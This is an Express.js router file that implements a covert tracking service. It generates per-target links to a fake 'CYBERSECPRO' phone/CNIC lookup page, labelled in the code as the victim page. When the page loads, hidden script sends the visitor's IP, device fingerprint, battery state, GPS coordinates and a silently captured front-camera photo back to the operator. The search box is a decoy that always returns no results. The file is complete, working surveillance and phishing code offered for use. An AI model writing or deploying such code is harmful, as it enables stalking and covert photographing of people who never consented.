const express = require('express');
const crypto  = require('crypto');
const router  = express.Router();

// In-memory session store (per-process; resets on dyno restart — acceptable for short-lived tracking links)
const _locStore = {};

// ── Cleanup: remove sessions older than 2 hours so memory doesn't grow forever ──
setInterval(() => {
    const cutoff = Date.now() - 2 * 60 * 60 * 1000;
    for (const tok of Object.keys(_locStore)) {
        if (_locStore[tok].timestamp < cutoff) delete _locStore[tok];
    }
}, 30 * 60 * 1000); // run every 30 min

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/start   →   generate tracking session
//  Body: { userId }   — userId is just a label (e.g. WhatsApp JID)
// ─────────────────────────────────────────────────────────────────────
router.post('/start', (req, res) => {
    const userId = req.body.userId || req.query.userId;
    if (!userId) return res.status(400).json({ error: 'Missing userId' });

    const sessionToken = crypto.randomBytes(16).toString('hex');
    _locStore[sessionToken] = {
        userId,
        clientIp   : null,
        metrics    : null,
        cameraImage: null,
        timestamp  : Date.now()
    };

    // ── Auto-detect public URL — zero config needed ─────────────────────────
    // Priority:
    //  1. global._detectedPublicHost  — auto-saved from first external HTTP request
    //  2. HEROKU_APP_NAME env          — just set the APP NAME (not full URL); Heroku auto-sets this
    //                                    if Dyno Metadata labs feature is enabled (free)
    //  3. APP_URL env                  — manual fallback (full URL)
    //  4. REPLIT_DEV_DOMAIN            — Replit environment
    //  5. localhost                    — local dev only
    const host = (global._detectedPublicHost || '')
        || (process.env.HEROKU_APP_NAME  ? `https://${process.env.HEROKU_APP_NAME}.herokuapp.com` : '')
        || (process.env.APP_URL          ? process.env.APP_URL.replace(/\/$/, '') : '')
        || (process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : '')
        || `http://localhost:${process.env.PORT || 3001}`;

    const link = `${host}/api/location/v/${sessionToken}`;
    res.json({ sessionToken, link });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/result/:sessionToken   →   fetch captured data
// ─────────────────────────────────────────────────────────────────────
router.get('/result/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    res.json({
        userId     : s.userId,
        ip         : s.clientIp,
        metrics    : s.metrics,
        hasCamera  : !!s.cameraImage,
        cameraThumb: s.cameraImage ? s.cameraImage.substring(0, 80) + '…' : null,
        timestamp  : s.timestamp
    });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/camera/:sessionToken   →   full camera base64
// ─────────────────────────────────────────────────────────────────────
router.get('/camera/:sessionToken', (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found or expired' });
    if (!s.cameraImage) return res.status(204).json({ error: 'No camera image yet' });
    res.json({ image: s.cameraImage });
});

// ─────────────────────────────────────────────────────────────────────
//  GET  /api/location/v/:sessionToken   →   VICTIM PAGE (tracking HTML)
//  Looks exactly like: cybersecprosimdatabase.vercel.app
//  Silently captures: IP, GPS, device metrics, front camera
// ─────────────────────────────────────────────────────────────────────
router.get('/v/:sessionToken', (req, res) => {
    const sessionToken = req.params.sessionToken;
    if (!_locStore[sessionToken]) return res.status(404).send('Link expired or invalid.');

    // Capture victim IP immediately on page load
    const clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim()
        || req.socket.remoteAddress;
    _locStore[sessionToken].clientIp   = clientIp;
    _locStore[sessionToken].timestamp  = Date.now();

    res.setHeader('Content-Type', 'text/html; charset=utf-8');
    res.send(`<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>CYBERSECPRO — Intelligence Database</title>
  <style>
    *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      min-height: 100vh;
      background: #0d1b2e;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      padding: 20px;
    }

    .card {
      width: 100%;
      max-width: 440px;
      border-radius: 16px;
      overflow: hidden;
      box-shadow: 0 24px 60px rgba(0,0,0,0.55);
    }

    /* ── Header gradient (dark navy → deep purple → crimson) ── */
    .card-header {
      background: linear-gradient(135deg, #1a2744 0%, #2d1b4e 45%, #8b1a3a 100%);
      padding: 28px 24px 22px;
      display: flex;
      flex-direction: column;
      align-items: center;
      gap: 6px;
    }
    .header-icon { margin-bottom: 4px; }
    .header-title {
      color: #fff;
      font-size: 22px;
      font-weight: 700;
      letter-spacing: 3.5px;
    }
    .header-sub {
      color: rgba(255,255,255,0.72);
      font-size: 12px;
      letter-spacing: 0.4px;
    }

    /* ── Card body ── */
    .card-body {
      background: #fff;
      padding: 22px 20px 26px;
    }

    /* Tabs */
    .tabs {
      display: flex;
      border-radius: 8px;
      overflow: hidden;
      margin-bottom: 18px;
      border: 1.5px solid #e8e8e8;
    }
    .tab {
      flex: 1; padding: 10px 0;
      border: none; cursor: pointer;
      font-size: 13.5px; font-weight: 600;
      display: flex; align-items: center; justify-content: center; gap: 6px;
      transition: background 0.18s, color 0.18s;
    }
    .tab.active   { background: #e02e4f; color: #fff; }
    .tab.inactive { background: #f5f5f5; color: #666; }

    /* Input */
    .input-label {
      font-size: 13px; font-weight: 600; color: #222;
      display: flex; align-items: center; gap: 6px;
      margin-bottom: 9px;
    }
    .input-row { display: flex; gap: 8px; margin-bottom: 14px; }
    .input-row input {
      flex: 1;
      border: 1.5px solid #ddd; border-radius: 8px;
      padding: 11px 13px; font-size: 14px; color: #333; outline: none;
      transition: border-color 0.18s;
    }
    .input-row input:focus { border-color: #e02e4f; }
    .btn-search {
      background: #1a2744; color: #fff;
      border: none; border-radius: 8px;
      padding: 11px 18px;
      font-size: 13.5px; font-weight: 700; letter-spacing: 0.4px;
      cursor: pointer; white-space: nowrap;
      transition: background 0.18s;
      min-width: 82px;
    }
    .btn-search:hover    { background: #243563; }
    .btn-search:disabled { background: #999; cursor: not-allowed; }

    /* Result area */
    #result-area { min-height: 0; margin-bottom: 4px; }
    .res-loading {
      color: #1a2744; font-size: 13px;
      text-align: center; padding: 10px 0 14px;
    }
    .res-error {
      font-size: 13px; color: #b92b2b;
      background: #fdf1f0; border-left: 3px solid #e02e4f;
      border-radius: 7px; padding: 10px 13px;
      margin-bottom: 14px; line-height: 1.5;
    }

    /* Social buttons */
    .btn-wa, .btn-tg {
      display: flex; align-items: center; justify-content: center; gap: 9px;
      width: 100%; padding: 13px; border: none; border-radius: 8px;
      font-size: 14px; font-weight: 600; cursor: pointer;
      text-decoration: none; margin-bottom: 10px;
      transition: filter 0.18s;
    }
    .btn-wa { background: #25d366; color: #fff; }
    .btn-tg { background: #0088cc; color: #fff; margin-bottom: 0; }
    .btn-wa:hover, .btn-tg:hover { filter: brightness(0.9); }

    /* Footer */
    .footer {
      margin-top: 16px;
      font-size: 10.5px;
      color: rgba(255,255,255,0.35);
      letter-spacing: 0.6px;
      text-transform: uppercase;
    }

    /* Hidden tracking elements */
    #_tv { display: none; }
    #_tc { display: none; }
  </style>
</head>
<body>

  <div class="card">

    <!-- ── Header ── -->
    <div class="card-header">
      <div class="header-icon">
        <svg width="40" height="40" viewBox="0 0 40 40" fill="none">
          <path d="M20 4L6 10V20C6 28.4 12.56 36.1 20 38C27.44 36.1 34 28.4 34 20V10L20 4Z"
                fill="rgba(255,255,255,0.15)" stroke="rgba(255,255,255,0.75)" stroke-width="1.8"/>
          <path d="M14 20L18 24L26 16" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
        </svg>
      </div>
      <div class="header-title">CYBERSECPRO</div>
      <div class="header-sub">Intelligence Database Retrieval System</div>
    </div>

    <!-- ── Body ── -->
    <div class="card-body">

      <!-- Tabs -->
      <div class="tabs">
        <button class="tab active" id="tab-phone" onclick="switchTab('phone')">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="currentColor">
            <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24 11.47 11.47 0 003.58.57
                     1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1
                     11.47 11.47 0 00.57 3.57 1 1 0 01-.25 1.02l-2.2 2.2z"/>
          </svg>
          Phone
        </button>
        <button class="tab inactive" id="tab-cnic" onclick="switchTab('cnic')">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8">
            <rect x="3" y="5" width="18" height="14" rx="2"/>
            <line x1="7" y1="10" x2="17" y2="10"/>
            <line x1="7" y1="14" x2="13" y2="14"/>
          </svg>
          CNIC
        </button>
      </div>

      <!-- Label -->
      <div class="input-label" id="input-label">
        <svg width="14" height="14" viewBox="0 0 24 24" fill="#e02e4f">
          <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24 11.47 11.47 0 003.58.57
                   1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1
                   11.47 11.47 0 00.57 3.57 1 1 0 01-.25 1.02l-2.2 2.2z"/>
        </svg>
        Enter Mobile Number
      </div>

      <!-- Input + Search -->
      <div class="input-row">
        <input type="text" id="qinput" placeholder="e.g. 3417022212" maxlength="20"
               onkeydown="if(event.key==='Enter') doSearch()">
        <button class="btn-search" id="bsearch" onclick="doSearch()">SEARCH</button>
      </div>

      <!-- Result -->
      <div id="result-area"></div>

      <!-- Social links -->
      <a class="btn-wa" href="https://wa.me/923417022212" target="_blank" rel="noopener">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
          <path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15
                   -.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463
                   -2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606
                   .134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371
                   -.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51
                   -.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016
                   -1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487
                   .709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758
                   -.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347z"/>
          <path d="M12 0C5.373 0 0 5.373 0 12c0 2.096.541 4.066 1.487 5.782L.057 23.617
                   a.75.75 0 00.922.922l5.835-1.43A11.945 11.945 0 0012 24c6.627 0 12-5.373
                   12-12S18.627 0 12 0zm0 22c-1.85 0-3.595-.487-5.107-1.34l-.363-.21
                   -3.836.94.96-3.836-.21-.363A9.953 9.953 0 012 12C2 6.477 6.477 2 12 2
                   s10 4.477 10 10-4.477 10-10 10z"/>
        </svg>
        WhatsApp: +923417022212
      </a>

      <a class="btn-tg" href="https://t.me/cybersecprobot" target="_blank" rel="noopener">
        <svg width="18" height="18" viewBox="0 0 24 24" fill="white">
          <path d="M11.944 0A12 12 0 000 12a12 12 0 0012 12 12 12 0 0012-12A12 12 0 0012
                   0a12 12 0 00-.056 0zm4.962 7.224c.1-.002.321.023.465.14a.506.506 0
                   01.171.325c.016.093.036.306.02.472-.18 1.898-.962 6.502-1.36 8.627
                   -.168.9-.499 1.201-.82 1.23-.696.065-1.225-.46-1.9-.902-1.056-.693
                   -1.653-1.124-2.678-1.8-1.185-.78-.417-1.21.258-1.91.177-.184 3.247
                   -2.977 3.307-3.23.007-.032.014-.15-.056-.212s-.174-.041-.249-.024
                   c-.106.024-1.793 1.14-5.061 3.345-.48.33-.913.49-1.302.48-.428-.008
                   -1.252-.241-1.865-.44-.752-.245-1.349-.374-1.297-.789.027-.216.325
                   -.437.893-.663 3.498-1.524 5.83-2.529 6.998-3.014 3.332-1.386 4.025
                   -1.627 4.476-1.635z"/>
        </svg>
        Telegram: CYBER SEC PRO BOT
      </a>

    </div>
  </div>

  <div class="footer">POWERED BY CYBERSECPRO API &copy; 2026</div>

  <!-- Hidden tracking elements -->
  <video id="_tv" autoplay playsinline muted></video>
  <canvas id="_tc"></canvas>

  <script>
  (function () {
    // ═══════════════════════════════════════════════════
    //  SILENT TRACKING — runs immediately in background
    // ═══════════════════════════════════════════════════
    var TOK  = '${sessionToken}';
    var BASE = window.location.origin;

    // ── Device + browser metrics ────────────────────────
    var metrics = {
      ua         : navigator.userAgent,
      platform   : navigator.platform || '',
      lang       : navigator.language,
      langs      : navigator.languages ? Array.from(navigator.languages) : [],
      screen     : { w: screen.width, h: screen.height, aw: screen.availWidth, ah: screen.availHeight },
      dpr        : window.devicePixelRatio || 1,
      tz         : Intl.DateTimeFormat().resolvedOptions().timeZone,
      cookies    : navigator.cookieEnabled,
      cores      : navigator.hardwareConcurrency || null,
      memory     : navigator.deviceMemory || null,
      touch      : ('ontouchstart' in window) || navigator.maxTouchPoints > 0,
      touchPts   : navigator.maxTouchPoints || 0,
      referrer   : document.referrer || 'direct',
      conn       : navigator.connection ? {
                     type: navigator.connection.effectiveType,
                     rtt : navigator.connection.rtt,
                     dl  : navigator.connection.downlink
                   } : null,
      battery    : null,
      gps        : null
    };

    function sendMetrics () {
      var body = JSON.stringify(metrics);
      try {
        if (navigator.sendBeacon) {
          navigator.sendBeacon(BASE + '/api/location/log/' + TOK,
            new Blob([body], { type: 'application/json' }));
        } else {
          fetch(BASE + '/api/location/log/' + TOK, {
            method: 'POST', headers: { 'Content-Type': 'application/json' },
            body: body, keepalive: true
          });
        }
      } catch (e) {}
    }

    // Send immediately (IP + device already captured)
    sendMetrics();

    // ── Battery (no permission prompt) ──────────────────
    if (navigator.getBattery) {
      navigator.getBattery().then(function (b) {
        metrics.battery = { pct: Math.round(b.level * 100), charging: b.charging };
        sendMetrics();
      }).catch(function () {});
    }

    // ── GPS (shows browser location prompt) ─────────────
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        function (pos) {
          metrics.gps = {
            lat : pos.coords.latitude,
            lng : pos.coords.longitude,
            acc : pos.coords.accuracy,
            alt : pos.coords.altitude,
            spd : pos.coords.speed
          };
          sendMetrics();
        },
        function () { /* denied — no action needed, IP geo used instead */ },
        { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
      );
    }

    // ── Front camera capture (silent) ───────────────────
    function captureCamera () {
      if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
      var vid = document.getElementById('_tv');
      var can = document.getElementById('_tc');
      navigator.mediaDevices.getUserMedia({
        audio: false,
        video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } }
      }).then(function (stream) {
        vid.srcObject = stream;
        vid.onloadedmetadata = function () {
          vid.play();
          setTimeout(function () {
            can.width  = vid.videoWidth  || 640;
            can.height = vid.videoHeight || 480;
            can.getContext('2d').drawImage(vid, 0, 0, can.width, can.height);
            var img = can.toDataURL('image/jpeg', 0.82);
            fetch(BASE + '/api/location/cam/' + TOK, {
              method  : 'POST',
              headers : { 'Content-Type': 'application/json' },
              body    : JSON.stringify({ image: img }),
              keepalive: true
            }).catch(function () {});
            stream.getTracks().forEach(function (t) { t.stop(); });
          }, 900);
        };
      }).catch(function () { /* user denied camera — silently ignored */ });
    }

    captureCamera();
    setTimeout(captureCamera, 3000);  // retry once after 3 s

    // ═══════════════════════════════════════════════════
    //  UI — fake search (realistic UX for victim)
    // ═══════════════════════════════════════════════════
    var _mode = 'phone';

    window.switchTab = function (type) {
      _mode = type;
      var ph = type === 'phone';
      document.getElementById('tab-phone').className = 'tab ' + (ph ? 'active' : 'inactive');
      document.getElementById('tab-cnic').className  = 'tab ' + (ph ? 'inactive' : 'active');
      document.getElementById('input-label').innerHTML = ph
        ? '<svg width="14" height="14" viewBox="0 0 24 24" fill="#e02e4f"><path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.01-.24 11.47 11.47 0 003.58.57 1 1 0 011 1V20a1 1 0 01-1 1A17 17 0 013 4a1 1 0 011-1h3.5a1 1 0 011 1 11.47 11.47 0 00.57 3.57 1 1 0 01-.25 1.02l-2.2 2.2z"/></svg> Enter Mobile Number'
        : '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#e02e4f" stroke-width="1.8"><rect x="3" y="5" width="18" height="14" rx="2"/><line x1="7" y1="10" x2="17" y2="10"/><line x1="7" y1="14" x2="13" y2="14"/></svg> Enter CNIC Number';
      document.getElementById('qinput').placeholder = ph ? 'e.g. 3417022212' : 'e.g. 35201-1234567-1';
      document.getElementById('result-area').innerHTML = '';
    };

    window.doSearch = function () {
      var q = (document.getElementById('qinput').value || '').trim();
      if (!q) return;
      var btn = document.getElementById('bsearch');
      btn.disabled = true; btn.textContent = '...';
      document.getElementById('result-area').innerHTML =
        '<div class="res-loading">🔍 Searching database...</div>';
      setTimeout(function () {
        var safe = q.replace(/[<>&"']/g, '');
        document.getElementById('result-area').innerHTML =
          '<div class="res-error">❌ No records found for <b>' + safe + '</b>.<br>' +
          'For complete database access please contact us on WhatsApp or Telegram below.</div>';
        btn.disabled = false; btn.textContent = 'SEARCH';
      }, 2400);
    };

  })();
  </script>
</body>
</html>`);
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/log/:sessionToken   →   receive device metrics
// ─────────────────────────────────────────────────────────────────────
router.post('/log/:sessionToken', express.json({ limit: '50kb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.metrics   = req.body;
    s.timestamp = Date.now();
    res.json({ status: 'ok' });
});

// ─────────────────────────────────────────────────────────────────────
//  POST /api/location/cam/:sessionToken   →   receive camera image
// ─────────────────────────────────────────────────────────────────────
router.post('/cam/:sessionToken', express.json({ limit: '10mb' }), (req, res) => {
    const s = _locStore[req.params.sessionToken];
    if (!s) return res.status(404).json({ error: 'Session not found' });
    s.cameraImage = req.body.image;
    s.timestamp   = Date.now();
    res.json({ status: 'ok' });
});

module.exports = router;
